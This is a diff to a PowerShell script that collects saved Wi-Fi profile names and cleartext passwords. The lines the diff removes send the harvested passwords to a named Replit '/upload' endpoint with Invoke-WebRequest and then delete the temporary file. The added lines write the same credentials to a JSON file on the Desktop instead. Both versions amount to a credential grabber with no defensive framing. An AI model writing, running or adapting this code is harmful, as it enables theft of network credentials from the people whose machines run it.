@@ -12,18 +12,16 @@ foreach ($profile in $wifiProfiles) {
     }
 }
 
+# Select only the Profile Name and Password fields
+$selectedData = $wifiPasswords | Select-Object "Profile Name", "Password"
+
 # Convert the data to JSON
-$jsonData = $wifiPasswords | ConvertTo-Json
+$jsonData = $selectedData | ConvertTo-Json
 
-# URL of your Replit server endpoint
-$replitUrl = "https://52f56a4e-599f-460a-9a7f-30366e004a3f-00-1gskngmpkkspx.sisko.replit.dev/upload"
+# Specify the path to save the JSON file on the desktop
+$jsonFilePath = "$env:USERPROFILE\Desktop\wifi_passwords.json"
 
-# Save the data to a temporary JSON file
-$jsonFilePath = [System.IO.Path]::GetTempFileName() + ".json"
+# Save the data to the JSON file
 $jsonData | Set-Content -Path $jsonFilePath
 
-# Upload the file to Replit
-Invoke-WebRequest -Uri $replitUrl -Method Post -InFile $jsonFilePath
-
-# Clean up the temporary file
-Remove-Item $jsonFilePath
+Write-Host "Wi-Fi profile names and passwords saved to: $jsonFilePath"
